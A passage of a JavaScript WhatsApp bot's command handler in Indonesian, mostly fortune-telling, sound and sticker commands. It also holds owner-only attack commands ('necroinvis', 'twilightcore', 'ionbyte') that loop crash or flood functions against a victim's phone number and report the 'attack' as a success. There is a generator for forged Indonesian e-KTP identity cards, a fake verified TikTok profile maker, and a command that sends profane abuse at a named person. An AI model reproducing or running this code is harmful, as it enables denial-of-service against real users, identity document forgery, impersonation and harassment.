aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                ReplyLanz(awikwok)
            }
            break
            case 'marahi-ripper':
            case 'ripper': {
                if (!q) return warning(`Contoh : ${prefix}marahi-ripper Asuma`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} NAMA KONTOL ITU PANTEK, ANJING LO DASAR ${qq}, UANG RECEH DIEMBAT DASAR BAJINGAN, PUNYA INDUK GA SIH? ${qq} WOY RIPPER YATIM ${qq} GA TAKUT APA AMA TUHAN LU ANJINGLO MEMEK KONTOL. APALAGI NGE JB KEK ORANG MISKIN GA GUNA 😹😹😹, ${qq}² SEBENARNYA GW *MALU JADI LO*.... TAU GA SIH, ${qq}. UANG HASIL BEGITUAN GA HIKMAH 😹😹. MAU DICERAMAHIN?. DICERAMAHI KOK SAMA BOT DASAR YATIM ${qq}.`
                ReplyLanz(awikwok)
            }
            break 

case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await Putzz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: ' ', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: ' ',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await Putzz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break
//======================\\
case 'nomerhoki': case 'nomorhoki': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 6287862058684`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005, Kyouko, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005, Kyouko, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005, Kyouko, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005, Kyouko, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Putzzslebew`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami|Kyouko`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return ReplyLanz(anu.message)
Putzz.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (!ext)return ReplyLanz(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case 'rejeki': case 'rezeki': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return ReplyLanz(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
Putzz.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Contoh : ${prefix + command} Kyami, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} Kyami, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return ReplyLanz(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!text) return ReplyLanz(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return ReplyLanz(anu.message)
ReplyLanz(`• *Hasil :* ${anu.message}`)
}
break

case 'toimg2': {
	Putzz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return ReplyLanz(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Putzz.sendMessage(m.chat, { image: buffer }, { quoted: qtoko })      
fs.unlinkSync(name)
        })
        
} else return ReplyLanz(`Please Reply to non animated sticker`)
    }
    break

case 'cktp':
case 'fakektp': {
  if (!text) {
    return ReplyLanz(
`* Format salah*
 Contoh:
.cktp Nama|NIK|TTL|JK|Alamat|RT/RW|Desa|Kecamatan|Agama|Status|Pekerjaan|WNI|LINK_FOTO`
    )
  }

  let data = text.split('|')
  if (data.length < 13)
    return ReplyLanz('❌ Data kurang, pastikan semua data diisi')

  let [
    nama,
    nik,
    ttl,
    jk,
    alamat,
    rtrw,
    desa,
    kecamatan,
    agama,
    status,
    pekerjaan,
    kewarganegaraan,
    pasPhoto
  ] = data

  let api =
    `https://apocalypse.web.id/canvas/ektp?` +
    `provinsi=&kota=` +
    `&nik=${encodeURIComponent(nik)}` +
    `&nama=${encodeURIComponent(nama)}` +
    `&ttl=${encodeURIComponent(ttl)}` +
    `&jenis_kelamin=${encodeURIComponent(jk)}` +
    `&golongan_darah=` +
    `&alamat=${encodeURIComponent(alamat)}` +
    `&rt/rw=${encodeURIComponent(rtrw)}` +
    `&kel/desa=${encodeURIComponent(desa)}` +
    `&kecamatan=${encodeURIComponent(kecamatan)}` +
    `&agama=${encodeURIComponent(agama)}` +
    `&status=${encodeURIComponent(status)}` +
    `&pekerjaan=${encodeURIComponent(pekerjaan)}` +
    `&kewarganegaraan=${encodeURIComponent(kewarganegaraan)}` +
    `&masa_berlaku=SEUMUR+HIDUP` +
    `&terbuat=KPK` +
    `&pas_photo=${encodeURIComponent(pasPhoto)}`

  try {
    await Putzz.sendMessage(
      m.chat,
      {
        image: { url: api }
      },
      { quoted: m }
    )
  } catch (err) {
    console.error('KTP API ERROR:', err)
    ReplyLanz('⚠️ Server sedang sibuk')
  }
}
break
case "upceo": {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
            ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
            : m.quoted 
            ? m.quoted.sender 
            : '';
        if (jpmch.includes(orang)) 
            return ReplyLanz(`User ${orang.split('@')[0]} Sudah Terdaftar Sebagai ceo!`);
        await addb.push(orang);
        await fs.writeFileSync("./library/database/datasc.json", JSON.stringify(addb));
        ReplyLanz(`Berhasil Menambahkan ${orang.split('@')[0]} Sebagai Pengguna add database`);
    } else {
        return ReplyLanz(example("@tag/62838XXX"));
    }
}
break;
case "addmiskin": {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
            ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
            : m.quoted 
            ? m.quoted.sender 
            : '';
        if (jpmch.includes(orang)) 
            return ReplyLanz(`User ${orang.split('@')[0]} Sudah Terdaftar Sebagai Premium!`);
        await jpmch.push(orang);
        await fs.writeFileSync("./library/database/userVip/aksesJpm.json", JSON.stringify(jpmch));
        ReplyLanz(`Berhasil Menambahkan ${orang.split('@')[0]} Sebagai Pengguna Jpmch`);
    } else {
        return ReplyLanz(example("@tag/62838XXX"));
    }
}
break;

case 'faketiktok': case 'tiktokfake': {
  if (!text) {
    return Putzz.sendMessage(m.chat, {
      text: `*Fake TikTok Profile Generator*\n\n` +
            `Kirim perintah dengan format:\n` +
            `*${prefix + command}* Nama|Username|Followers|Following|Likes|Bio|Verified(true/false)|isFollow(true/false)|dark/light\n\n` +
            `Contoh:\n` +
            `*${prefix + command}* Apa Kek|Yubi|4020030|12|789000|Beginner in coding, but I love it! Follow me for more coding tips and tricks.|true|true|dark`
    }, { quoted: m });
  }
  let [name, username, followers, following, likes, bio, verified = 'true', isFollow = 'true', dark = 'true'] = text.split('|')
  if (!name || !username || !followers || !following || !likes || !bio) {
    return ReplyLanz('Format salah.\nCoba ikuti contoh:\nNama|Username|Followers|Following|Likes|Bio|Verified|isFollow|Theme')
  }
  let ppUrl = await Putzz.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg')
  let apiUrl = `https://flowfalcon.dpdns.org/imagecreator/faketiktok?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&pp=${encodeURIComponent(ppUrl)}&verified=${verified}&followers=${followers}&following=${following}&likes=${likes}&bio=${encodeURIComponent(bio)}&dark=${dark}&isFollow=${isFollow}`

  try {
//const  require('axios');
    let { data } = await axios.get(apiUrl, { responseType: 'arraybuffer' })
    const buffer = Buffer.from(data)
    // = (await import('form-data')).default
    const form = new FormData()
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', buffer, 'tiktokfake.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    if (!upres.data || !upres.data.includes('catbox')) return ReplyLanz('Gagal upload gambar.')
    Putzz.sendMessage(m.chat, {
      image: { url: upres.data }
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    ReplyLanz('Terjadi kesalahan saat membuat gambar.')
  }
}
  break
               case 'toimage':
            case 'toimg': {
  if (!qmsg) return ReplyLanz('Pesan tidak ditemukan');
  let mime = qmsg.mimetype;
  if (!/webp/.test(mime)) return ReplyLanz(`Balas sticker dengan caption *${prefix + command}*`);
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: "⏱️",
                        key: m.key,
                    }
                })
                let media = await Putzz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    Putzz.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: qtoko
                    })
                    fs.unlinkSync(ran)
                })
            }
            break


case 'smeme2': case 'stickermeme2': case 'stickmeme2': {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Putzz.downloadAndSaveMediaMessage(qmsg)
mem = await CatBox(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await Putzz.sendAsSticker(m.chat, meme, m, { packname: global.packname, author: `dibuat oleh ${m.pushName}`, })
}
break
//==================masput===============//

case "necroinvis": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let Target = pelaku + "@s.whatsapp.net"
await Putzz.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
for (let r = 0; r < 50; r++) {
await delayMakerInvisible(Target);
await sleep(5000)
await delayMakerInvisible(Target)
}

let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyLanz(put)
}
break
        
case "twilightcore": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let Target = pelaku + "@s.whatsapp.net"
await Putzz.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
for (let r = 0; r < 50; r++) {
await FloodsCarousel(Target, Ptcp = true);
await sleep(5000)
await FloodsCarousel(Target, Ptcp = true)
}

let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Putzz.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyLanz(put)
}
break
        
case "ionbyte": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let Target = pelaku + "@s.whatsapp.net"
await Putzz.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
for (let r = 0; r < 50; r++) {
await delayMakerInvisible(Target);
